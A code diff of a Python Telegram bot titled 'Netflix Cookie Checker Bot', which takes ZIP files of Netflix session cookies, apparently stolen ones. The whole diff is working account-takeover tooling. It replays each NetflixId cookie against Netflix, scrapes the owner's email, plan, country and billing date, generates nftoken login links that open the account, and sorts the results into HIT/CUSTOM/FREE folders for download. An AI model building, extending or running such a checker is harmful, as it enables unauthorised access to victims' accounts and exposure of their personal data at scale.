@@ -9,6 +9,9 @@ import asyncio
 import requests
 import urllib.parse
 from datetime import datetime
+from threading import Lock
+import time
+import gc
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -43,22 +46,12 @@ try:
 except Exception as e:
     print(f"⚠️ Keep-alive not started: {e}")
 
-# ============ FIX FOR PYTHON 3.14 ============
-# Ensure event loop exists for Python 3.14+
-try:
-    asyncio.get_running_loop()
-except RuntimeError:
-    try:
-        asyncio.set_event_loop(asyncio.new_event_loop())
-    except:
-        pass
-
 # ============ TELEGRAM IMPORTS ============
 try:
     from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 except Exception as e:
-    print(f"Telegram import error: {e}")
+    print(f"❌ Telegram import error: {e}")
     sys.exit(1)
 
 # ============ NETFLIX CONFIGURATION ============
@@ -120,9 +113,52 @@ REQUIRED_COOKIE = "NetflixId"
 
 # ============ BOT CONFIGURATION ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
+if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    print("❌ Please set BOT_TOKEN environment variable!")
+    sys.exit(1)
 
-# ============ COOKIE EXTRACTION FUNCTIONS ============
+MAX_FILE_SIZE = 5 * 1024 * 1024
+BATCH_SIZE = 10  # 10 files per batch
+
+# ============ COUNTERS ============
+class Counters:
+    def __init__(self):
+        self.hit = 0
+        self.custom = 0
+        self.free = 0
+        self.bad = 0
+        self.lock = Lock()
+    
+    def get_stats(self):
+        with self.lock:
+            return f"HIT: {self.hit} | CUSTOM: {self.custom} | FREE: {self.free} | BAD: {self.bad}"
+    
+    def add_hit(self):
+        with self.lock:
+            self.hit += 1
+    
+    def add_custom(self):
+        with self.lock:
+            self.custom += 1
+    
+    def add_free(self):
+        with self.lock:
+            self.free += 1
+    
+    def add_bad(self):
+        with self.lock:
+            self.bad += 1
+    
+    def reset(self):
+        with self.lock:
+            self.hit = 0
+            self.custom = 0
+            self.free = 0
+            self.bad = 0
+
+counters = Counters()
+
+# ============ COOKIE FUNCTIONS ============
 def parse_netscape_cookie_line(line):
     parts = line.strip().split("\t")
     if len(parts) >= 7:
@@ -144,44 +180,39 @@ def fix_email_display(email):
 
 def extract_cookie_dict(text):
     cookie_dict = {}
-    
     for raw_line in text.splitlines():
         line = raw_line.strip()
         if not line or line.startswith("#"):
             continue
         cookie_dict.update(parse_netscape_cookie_line(line))
-    
     try:
         data = json.loads(text)
-    except json.JSONDecodeError:
-        data = None
-    
-    if isinstance(data, list):
-        for cookie in data:
-            name = cookie.get("name")
-            value = cookie.get("value")
-            if name in COOKIE_KEYS and isinstance(value, str):
-                cookie_dict[name] = decode_cookie_value(value)
-    elif isinstance(data, dict):
-        if any(key in data for key in COOKIE_KEYS):
-            for key in COOKIE_KEYS:
-                value = data.get(key)
-                if isinstance(value, str):
-                    cookie_dict[key] = decode_cookie_value(value)
-        elif isinstance(data.get("cookies"), list):
-            for cookie in data["cookies"]:
+        if isinstance(data, list):
+            for cookie in data:
                 name = cookie.get("name")
                 value = cookie.get("value")
                 if name in COOKIE_KEYS and isinstance(value, str):
                     cookie_dict[name] = decode_cookie_value(value)
-    
+        elif isinstance(data, dict):
+            if any(key in data for key in COOKIE_KEYS):
+                for key in COOKIE_KEYS:
+                    value = data.get(key)
+                    if isinstance(value, str):
+                        cookie_dict[key] = decode_cookie_value(value)
+            elif isinstance(data.get("cookies"), list):
+                for cookie in data["cookies"]:
+                    name = cookie.get("name")
+                    value = cookie.get("value")
+                    if name in COOKIE_KEYS and isinstance(value, str):
+                        cookie_dict[name] = decode_cookie_value(value)
+    except:
+        pass
     for key in COOKIE_KEYS:
         if key in cookie_dict:
             continue
         match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
         if match:
             cookie_dict[key] = decode_cookie_value(match.group(1))
-    
     return cookie_dict
 
 def extract_cookies_from_file(file_path):
@@ -192,35 +223,87 @@ def extract_cookies_from_file(file_path):
     except Exception:
         return {}
 
+def get_account_info(cookie_dict):
+    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
+    if not netflix_id:
+        return None
+    url = "https://www.netflix.com/account"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "close",
+    }
+    cookies = {"NetflixId": netflix_id}
+    try:
+        response = requests.get(url, headers=headers, cookies=cookies, timeout=8, verify=False)
+        text = response.text
+        response.close()
+        info = {
+            "status": "Unknown",
+            "email": "Unknown",
+            "country": "Unknown",
+            "plan": "Unknown",
+            "maxStreams": "Unknown",
+            "memberSince": "Unknown",
+            "nextBilling": "Unknown",
+        }
+        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
+        if status_match:
+            status = status_match.group(1)
+            if status == "CURRENT_MEMBER":
+                info["status"] = "Active"
+            elif status == "FORMER_MEMBER":
+                info["status"] = "Canceled"
+            elif status == "NEVER_MEMBER":
+                info["status"] = "Free"
+            else:
+                info["status"] = status
+        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
+        if not email_match:
+            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
+        if email_match:
+            info["email"] = fix_email_display(email_match.group(1))
+        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
+        if country_match:
+            info["country"] = country_match.group(1)
+        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
+        if not plan_match:
+            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
+        if plan_match:
+            info["plan"] = plan_match.group(1)
+        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
+        if streams_match:
+            info["maxStreams"] = streams_match.group(1)
+        since_match = re.search(r'"memberSince":"([^"]+)"', text)
+        if since_match:
+            info["memberSince"] = since_match.group(1)
+        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
+        if billing_match:
+            info["nextBilling"] = billing_match.group(1)
+        return info
+    except Exception:
+        return None
+
 def get_nftoken_from_cookies(cookie_dict):
     netflix_id = cookie_dict.get(REQUIRED_COOKIE)
     if not netflix_id:
         return None, None
-    
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
-    
+    headers["Connection"] = "close"
     try:
-        response = requests.get(
-            API_URL,
-            params=QUERY_PARAMS,
-            headers=headers,
-            timeout=30,
-            verify=False,
-        )
+        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=8, verify=False)
         response.raise_for_status()
         data = response.json()
-        
+        response.close()
         token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
         token = token_data.get("token")
         expires = token_data.get("expires")
-        
         if not token:
             return None, None
-        
         if isinstance(expires, int) and len(str(expires)) == 13:
             expires //= 1000
-        
         return token, expires
     except Exception:
         return None, None
@@ -233,87 +316,13 @@ def format_expiry(expires):
     except Exception:
         return str(expires)
 
-def get_account_info(cookie_dict):
-    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
-    if not netflix_id:
-        return None
-    
-    url = "https://www.netflix.com/account"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "keep-alive",
-    }
-    cookies = {"NetflixId": netflix_id}
-    
-    try:
-        response = requests.get(url, headers=headers, cookies=cookies, timeout=15, verify=False)
-        text = response.text
-        
-        info = {
-            "status": "Unknown",
-            "email": "Unknown",
-            "country": "Unknown",
-            "plan": "Unknown",
-            "maxStreams": "Unknown",
-            "memberSince": "Unknown",
-            "nextBilling": "Unknown",
-        }
-        
-        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
-        if status_match:
-            status = status_match.group(1)
-            if status == "CURRENT_MEMBER":
-                info["status"] = "Active"
-            elif status == "FORMER_MEMBER":
-                info["status"] = "Canceled"
-            elif status == "NEVER_MEMBER":
-                info["status"] = "Free"
-            else:
-                info["status"] = status
-        
-        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
-        if not email_match:
-            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
-        if email_match:
-            info["email"] = fix_email_display(email_match.group(1))
-        
-        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
-        if country_match:
-            info["country"] = country_match.group(1)
-        
-        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
-        if not plan_match:
-            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
-        if plan_match:
-            info["plan"] = plan_match.group(1)
-        
-        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
-        if streams_match:
-            info["maxStreams"] = streams_match.group(1)
-        
-        since_match = re.search(r'"memberSince":"([^"]+)"', text)
-        if since_match:
-            info["memberSince"] = since_match.group(1)
-        
-        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
-        if billing_match:
-            info["nextBilling"] = billing_match.group(1)
-        
-        return info
-    except Exception:
-        return None
-
 def classify_plan(plan_name):
     if not plan_name:
         return "Unknown"
-    
     plan_lower = plan_name.lower()
     basic_keywords = ["basic", "dasar", "asas", "basis", "básico", "essentiel", "base"]
     standard_keywords = ["standard", "standar", "standart", "estándar", "padrão"]
     premium_keywords = ["premium", "prémium", "perhe"]
-    
     for kw in basic_keywords:
         if kw in plan_lower:
             return "Basic"
@@ -323,13 +332,59 @@ def classify_plan(plan_name):
     for kw in premium_keywords:
         if kw in plan_lower:
             return "Premium"
-    
     return plan_name
 
 def is_valid_cookie(cookie_dict):
     return REQUIRED_COOKIE in cookie_dict
 
-# ============ FILE PROCESSING FUNCTIONS ============
+def process_single_cookie(file_path):
+    try:
+        cookie_dict = extract_cookies_from_file(file_path)
+        if not is_valid_cookie(cookie_dict):
+            return None
+        account_info = get_account_info(cookie_dict)
+        if not account_info or account_info["status"] == "Unknown":
+            return None
+        account_info["email"] = fix_email_display(account_info["email"])
+        token, expires = get_nftoken_from_cookies(cookie_dict)
+        if not token:
+            return None
+        time_left_str = "Unknown"
+        if expires:
+            try:
+                expiry_dt = datetime.fromtimestamp(expires)
+                time_now = datetime.now()
+                time_left = expiry_dt - time_now
+                if time_left.total_seconds() > 0:
+                    days = time_left.days
+                    hours = time_left.seconds // 3600
+                    minutes = (time_left.seconds % 3600) // 60
+                    time_left_str = f"{days}d {hours}h {minutes}m"
+                else:
+                    time_left_str = "EXPIRED"
+            except:
+                pass
+        result = {
+            "email": account_info["email"],
+            "status": account_info["status"],
+            "country": account_info["country"],
+            "plan": account_info["plan"],
+            "plan_type": classify_plan(account_info["plan"]),
+            "maxStreams": account_info["maxStreams"],
+            "memberSince": account_info["memberSince"],
+            "nextBilling": account_info["nextBilling"],
+            "nftoken": token,
+            "expires": expires,
+            "expiry_formatted": format_expiry(expires),
+            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
+            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
+            "time_left": time_left_str
+        }
+        return result
+    except Exception as e:
+        return None
+
+# ============ FILE FUNCTIONS ============
 def extract_zip(file_path, extract_path):
     try:
         with zipfile.ZipFile(file_path, 'r') as zip_ref:
@@ -351,20 +406,233 @@ def find_txt_files(folder_path):
         pass
     return txt_files
 
-# ============ MAIN BOT FUNCTIONS ============
+def create_account_file(result, folder_path, filename):
+    filepath = os.path.join(folder_path, filename)
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write("=" * 50 + "\n")
+        f.write("NETFLIX ACCOUNT INFORMATION\n")
+        f.write("=" * 50 + "\n\n")
+        f.write(f"EMAIL: {result['email']}\n")
+        f.write(f"STATUS: {result['status']}\n")
+        f.write(f"COUNTRY: {result['country']}\n")
+        f.write(f"PLAN: {result['plan']} ({result['plan_type']})\n")
+        f.write(f"MAX STREAMS: {result['maxStreams']}\n")
+        f.write(f"MEMBER SINCE: {result['memberSince']}\n")
+        f.write(f"NEXT BILLING: {result['nextBilling']}\n")
+        f.write(f"EXPIRES: {result['expiry_formatted']}\n")
+        f.write(f"TIME LEFT: {result.get('time_left', 'Unknown')}\n")
+        f.write("\n" + "-" * 50 + "\n")
+        f.write("NFTOKEN LINKS:\n")
+        f.write("-" * 50 + "\n")
+        f.write(f"PC LINK: {result['pc_link']}\n")
+        f.write(f"PHONE LINK: {result['phone_link']}\n")
+        f.write("\n" + "=" * 50 + "\n")
+        f.write(f"CHECKED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+
+# ============ MASTER ZIP CREATOR ============
+def create_master_zip(all_results, timestamp):
+    try:
+        temp_dir = tempfile.mkdtemp()
+        hit_folder = os.path.join(temp_dir, "HIT")
+        custom_folder = os.path.join(temp_dir, "CUSTOM")
+        free_folder = os.path.join(temp_dir, "FREE")
+        os.makedirs(hit_folder, exist_ok=True)
+        os.makedirs(custom_folder, exist_ok=True)
+        os.makedirs(free_folder, exist_ok=True)
+        
+        for result in all_results:
+            email_safe = result['email'].replace('@', '_at_').replace('.', '_')
+            filename = f"{email_safe}.txt"
+            if result["status"] == "Active":
+                create_account_file(result, hit_folder, filename)
+            elif result["status"] == "Canceled":
+                create_account_file(result, custom_folder, filename)
+            elif result["status"] == "Free":
+                create_account_file(result, free_folder, filename)
+        
+        zip_path = os.path.join(temp_dir, f"All_Results_{timestamp}.zip")
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(temp_dir):
+                for file in files:
+                    if file.endswith('.txt'):
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, temp_dir)
+                        zipf.write(file_path, arcname)
+        
+        return zip_path
+    except Exception as e:
+        print(f"Error creating master ZIP: {e}")
+        return None
+
+# ============ BATCH PROCESSOR ============
+class BatchProcessor:
+    def __init__(self, update, context, total_files, timestamp):
+        self.update = update
+        self.context = context
+        self.total_files = total_files
+        self.timestamp = timestamp
+        self.batch_num = 0
+        self.total_batches = (total_files + BATCH_SIZE - 1) // BATCH_SIZE
+        self.all_results = []
+        self.batch_stats = []
+        self.all_batch_zip_paths = []
+    
+    async def process_batch(self, batch_files, batch_num):
+        results = []
+        processed = 0
+        batch_hit = 0
+        batch_custom = 0
+        batch_free = 0
+        batch_bad = 0
+        
+        start_msg = await self.update.message.reply_text(
+            f"📦 **Batch #{batch_num}/{self.total_batches}**\n\n"
+            f"📁 Processing {len(batch_files)} files...",
+            parse_mode="Markdown"
+        )
+        
+        for file_path in batch_files:
+            try:
+                processed += 1
+                result = process_single_cookie(file_path)
+                
+                if result:
+                    results.append(result)
+                    self.all_results.append(result)
+                    if result["status"] == "Active":
+                        batch_hit += 1
+                        counters.add_hit()
+                    elif result["status"] == "Canceled":
+                        batch_custom += 1
+                        counters.add_custom()
+                    elif result["status"] == "Free":
+                        batch_free += 1
+                        counters.add_free()
+                else:
+                    batch_bad += 1
+                    counters.add_bad()
+                
+                if processed % 5 == 0 or processed == len(batch_files):
+                    await start_msg.edit_text(
+                        f"📦 **Batch #{batch_num}/{self.total_batches}**\n\n"
+                        f"📁 {processed}/{len(batch_files)} files checked\n"
+                        f"📊 HIT: {batch_hit} | CUSTOM: {batch_custom} | FREE: {batch_free} | BAD: {batch_bad}",
+                        parse_mode="Markdown"
+                    )
+                
+                gc.collect()
+                
+            except Exception as e:
+                batch_bad += 1
+                counters.add_bad()
+                continue
+        
+        await start_msg.delete()
+        
+        batch_stats_msg = f"📦 **Batch #{batch_num}/{self.total_batches} Complete**\n\n"
+        batch_stats_msg += f"📊 HIT: {batch_hit} | CUSTOM: {batch_custom} | FREE: {batch_free} | BAD: {batch_bad}\n"
+        batch_stats_msg += f"📁 Files: {len(batch_files)}\n"
+        batch_stats_msg += f"✅ Valid: {len(results)}"
+        
+        await self.update.message.reply_text(batch_stats_msg, parse_mode="Markdown")
+        
+        self.batch_stats.append({
+            "batch": batch_num,
+            "hit": batch_hit,
+            "custom": batch_custom,
+            "free": batch_free,
+            "bad": batch_bad,
+            "total": len(results)
+        })
+        
+        gc.collect()
+        return results
+    
+    async def run(self, all_files):
+        for i in range(0, len(all_files), BATCH_SIZE):
+            self.batch_num += 1
+            batch_files = all_files[i:i + BATCH_SIZE]
+            
+            await self.process_batch(batch_files, self.batch_num)
+            
+            if self.batch_num < self.total_batches:
+                await asyncio.sleep(0.5)
+                gc.collect()
+        
+        # ============ SEND MASTER ZIP WITH ALL RESULTS ============
+        if self.all_results:
+            await self.update.message.reply_text(
+                f"📦 **Creating master ZIP file with all {len(self.all_results)} accounts...**",
+                parse_mode="Markdown"
+            )
+            
+            master_zip = create_master_zip(self.all_results, self.timestamp)
+            
+            if master_zip and os.path.exists(master_zip):
+                with open(master_zip, 'rb') as f:
+                    await self.update.message.reply_document(
+                        document=f,
+                        filename=f"All_Results_{self.timestamp}.zip",
+                        caption=f"✅ **ALL RESULTS COMPLETE!**\n\n"
+                                f"📊 Total valid accounts: {len(self.all_results)}\n"
+                                f"📁 Total files: {self.total_files}\n"
+                                f"📦 Total batches: {self.total_batches}\n\n"
+                                f"📊 {counters.get_stats()}\n\n"
+                                f"📂 Organized by: HIT, CUSTOM, FREE",
+                        parse_mode="Markdown"
+                    )
+                try:
+                    os.remove(master_zip)
+                    shutil.rmtree(os.path.dirname(master_zip))
+                except:
+                    pass
+            else:
+                # Fallback: send individual batch ZIPs
+                await self.update.message.reply_text(
+                    "⚠️ Could not create master ZIP. Sending individual batch results...",
+                    parse_mode="Markdown"
+                )
+                # This shouldn't happen with the new logic
+        
+        # Final summary
+        final_message = "✅ **SCAN COMPLETE!**\n\n"
+        final_message += "📊 **FINAL STATISTICS**\n"
+        final_message += "-" * 30 + "\n"
+        final_message += f"{counters.get_stats()}\n\n"
+        final_message += "📦 **BATCHES SUMMARY**\n"
+        final_message += "-" * 30 + "\n"
+        
+        for stat in self.batch_stats:
+            final_message += f"Batch #{stat['batch']}: "
+            final_message += f"HIT: {stat['hit']} | CUSTOM: {stat['custom']} | "
+            final_message += f"FREE: {stat['free']} | BAD: {stat['bad']}\n"
+        
+        final_message += "\n" + "-" * 30 + "\n"
+        final_message += f"📁 Total files: {self.total_files}\n"
+        final_message += f"✅ Total valid accounts: {len(self.all_results)}\n"
+        final_message += f"📦 Total batches: {self.total_batches}\n"
+        final_message += f"📎 All results in master ZIP above."
+        
+        await self.update.message.reply_text(final_message, parse_mode="Markdown")
+        return self.all_results
+
+# ============ TELEGRAM HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
         [InlineKeyboardButton("📖 How to Use", callback_data="help")],
         [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
+        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🎬 **Netflix Cookie Checker Bot**\n\n"
-        "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
-        "⚠️ **Maximum file size: 5 MB**\n\n"
-        "I will check all cookies, extract account info, and generate NFToken links.",
+        f"🎬 **Netflix Cookie Checker Bot**\n\n"
+        f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
+        f"⚡ **Batch processing: {BATCH_SIZE} files per batch**\n"
+        f"⚠️ **Maximum file size: 5 MB**\n\n"
+        f"📦 All results combined into ONE master ZIP file.\n"
+        f"📊 Final summary with all statistics.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -378,163 +646,100 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "4️⃣ Send the ZIP file to the bot\n\n"
         "📂 **Required Cookie Format:**\n"
         "• Netscape format or JSON\n"
-        "• Must contain: NetflixId\n"
-        "• Optional: SecureNetflixId\n\n"
-        "⚙️ **What the bot does:**\n"
-        "• Validates cookies\n"
-        "• Extracts account information\n"
-        "• Generates PC and Phone NFToken links\n"
-        "• Shows each account in a separate message"
+        "• Must contain: NetflixId\n\n"
+        f"⚡ **Processing:** {BATCH_SIZE} files per batch\n"
+        "📦 All results = ONE master ZIP\n"
+        "📊 Final summary with all statistics"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    try:
-        if update.callback_query:
-            await update.callback_query.edit_message_text(
-                help_text,
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-        else:
-            await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
-    except Exception as e:
-        print(f"Error in help_command: {e}")
+    if update.callback_query:
+        await update.callback_query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")
 
 async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     about_text = (
         "ℹ️ **About Bot**\n\n"
         "Netflix Cookie Checker Bot\n"
         "Checks Netflix cookies and generates NFToken links.\n\n"
-        "🔹 Version: 2.0\n"
-        "🔹 Supports: ZIP only\n"
-        "🔹 Max file size: 5 MB\n"
-        "🔹 Each account shown separately"
+        "🔹 Version: 12.0 (Master ZIP)\n"
+        f"🔹 Batch size: {BATCH_SIZE} files\n"
+        "🔹 All results = ONE master ZIP\n"
+        "🔹 Organized folders: HIT, CUSTOM, FREE\n"
+        "🔹 Final summary with statistics"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    try:
-        if update.callback_query:
-            await update.callback_query.edit_message_text(
-                about_text,
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-        else:
-            await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
-    except Exception as e:
-        print(f"Error in about_command: {e}")
+    if update.callback_query:
+        await update.callback_query.edit_message_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode="Markdown")
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats_text = f"📊 **Current Statistics**\n\n{counters.get_stats()}\n\n🔄 Use /resetstats to reset counters"
+    keyboard = [
+        [InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats")],
+        [InlineKeyboardButton("🔙 Back", callback_data="back")],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        await update.callback_query.edit_message_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
+
+async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    counters.reset()
+    if update.callback_query:
+        await update.callback_query.answer("📊 Statistics reset!", show_alert=True)
+        await stats_command(update, context)
+    else:
+        await update.message.reply_text("📊 Statistics reset!")
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    try:
-        if query.data == "send_file":
-            await query.edit_message_text(
-                "📤 **Send the ZIP file now**\n\n"
-                "Supported format: ZIP only\n"
-                "Maximum size: 5 MB",
-                parse_mode="Markdown"
-            )
-        
-        elif query.data == "help":
-            await help_command(update, context)
-        
-        elif query.data == "about":
-            await about_command(update, context)
-        
-        elif query.data == "back":
-            keyboard = [
-                [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
-                [InlineKeyboardButton("📖 How to Use", callback_data="help")],
-                [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await query.edit_message_text(
-                "🎬 **Netflix Cookie Checker Bot**\n\n"
-                "Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
-                "⚠️ **Maximum file size: 5 MB**",
-                reply_markup=reply_markup,
-                parse_mode="Markdown"
-            )
-    except Exception as e:
-        print(f"Error in button_callback: {e}")
-
-async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path, extract_dir):
-    try:
-        success, error_msg = extract_zip(file_path, extract_dir)
-        
-        if not success:
-            await update.message.reply_text(
-                f"❌ **Failed to extract archive!**\n\n{error_msg}",
-                parse_mode="Markdown"
-            )
-            return
-        
-        txt_files = find_txt_files(extract_dir)
-        
-        if not txt_files:
-            await update.message.reply_text(
-                "❌ **No TXT files found!**\n\nThe archive doesn't contain any TXT files.",
-                parse_mode="Markdown"
-            )
-            return
-        
-        results = []
-        total_checked = 0
-        
-        for txt_file in txt_files:
-            try:
-                result = process_cookie_file(txt_file)
-                total_checked += 1
-                if result:
-                    results.append(result)
-            except Exception as e:
-                print(f"Error processing file {txt_file}: {e}")
-                continue
-        
-        if not results:
-            await update.message.reply_text(
-                "❌ **No valid accounts found!**\n\n"
-                f"Total files checked: {total_checked}\n\n"
-                "Make sure your cookies contain valid NetflixId.",
-                parse_mode="Markdown"
-            )
-        else:
-            for i, result in enumerate(results, 1):
-                await send_account_message(update, context, result, i, len(results))
-            
-            await update.message.reply_text(
-                f"✅ **Scan Complete!**\n\n"
-                f"📊 Total accounts found: {len(results)}\n"
-                f"📁 Files checked: {total_checked}",
-                parse_mode="Markdown"
-            )
-            
-    except Exception as e:
-        await update.message.reply_text(
-            f"❌ **Error processing file!**\n\n{str(e)}",
+    if query.data == "send_file":
+        await query.edit_message_text("📤 **Send the ZIP file now**", parse_mode="Markdown")
+    elif query.data == "help":
+        await help_command(update, context)
+    elif query.data == "about":
+        await about_command(update, context)
+    elif query.data == "stats":
+        await stats_command(update, context)
+    elif query.data == "reset_stats":
+        await reset_stats_command(update, context)
+    elif query.data == "back":
+        keyboard = [
+            [InlineKeyboardButton("📦 Send ZIP File", callback_data="send_file")],
+            [InlineKeyboardButton("📖 How to Use", callback_data="help")],
+            [InlineKeyboardButton("ℹ️ About Bot", callback_data="about")],
+            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            f"🎬 **Netflix Cookie Checker Bot**\n\n"
+            f"Send me a ZIP archive containing TXT files with Netflix cookies.\n\n"
+            f"⚡ **Batch processing: {BATCH_SIZE} files per batch**\n"
+            f"⚠️ **Maximum file size: 5 MB**",
+            reply_markup=reply_markup,
             parse_mode="Markdown"
         )
-    finally:
-        try:
-            shutil.rmtree(os.path.dirname(extract_dir))
-        except:
-            pass
 
+# ============ MAIN HANDLER ============
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         document = update.message.document
         
         if document.file_size > MAX_FILE_SIZE:
             await update.message.reply_text(
-                "❌ **File too large!**\n\n"
-                f"Maximum size: 5 MB\n"
-                f"Your file size: {document.file_size / (1024*1024):.2f} MB",
+                f"❌ **File too large!**\n\nMax: 5 MB\nYour file: {document.file_size / (1024*1024):.2f} MB",
                 parse_mode="Markdown"
             )
             return
@@ -548,8 +753,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         await update.message.reply_text(
-            "⏳ **Processing your file...**\n\n"
-            "I'll notify you when the scan is complete.",
+            "⏳ **Downloading and extracting your file...**",
             parse_mode="Markdown"
         )
         
@@ -561,155 +765,67 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file = await context.bot.get_file(document.file_id)
         await file.download_to_drive(file_path)
         
-        asyncio.create_task(process_zip_file(update, context, file_path, extract_dir))
+        success, error_msg = extract_zip(file_path, extract_dir)
+        if not success:
+            await update.message.reply_text(f"❌ **Failed to extract!**\n\n{error_msg}", parse_mode="Markdown")
+            shutil.rmtree(temp_dir)
+            return
         
-    except Exception as e:
-        print(f"Error in handle_document: {e}")
+        txt_files = find_txt_files(extract_dir)
+        if not txt_files:
+            await update.message.reply_text("❌ **No TXT files found!**", parse_mode="Markdown")
+            shutil.rmtree(temp_dir)
+            return
+        
+        total_files = len(txt_files)
+        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+        
         await update.message.reply_text(
-            f"❌ **Error: {str(e)}**",
+            f"📂 **Found {total_files} TXT files**\n\n"
+            f"⚡ Will process in batches of {BATCH_SIZE}\n"
+            f"📦 Estimated batches: {(total_files + BATCH_SIZE - 1) // BATCH_SIZE}\n\n"
+            f"📎 All results will be combined into ONE master ZIP.",
             parse_mode="Markdown"
         )
-
-def process_cookie_file(file_path):
-    try:
-        cookie_dict = extract_cookies_from_file(file_path)
         
-        if not is_valid_cookie(cookie_dict):
-            return None
+        processor = BatchProcessor(update, context, total_files, timestamp)
+        await processor.run(txt_files)
         
-        account_info = get_account_info(cookie_dict)
-        if not account_info or account_info["status"] == "Unknown":
-            return None
-        
-        account_info["email"] = fix_email_display(account_info["email"])
-        
-        token, expires = get_nftoken_from_cookies(cookie_dict)
-        
-        if not token:
-            return None
-        
-        result = {
-            "email": account_info["email"],
-            "status": account_info["status"],
-            "country": account_info["country"],
-            "plan": account_info["plan"],
-            "plan_type": classify_plan(account_info["plan"]),
-            "maxStreams": account_info["maxStreams"],
-            "memberSince": account_info["memberSince"],
-            "nextBilling": account_info["nextBilling"],
-            "nftoken": token,
-            "expires": expires,
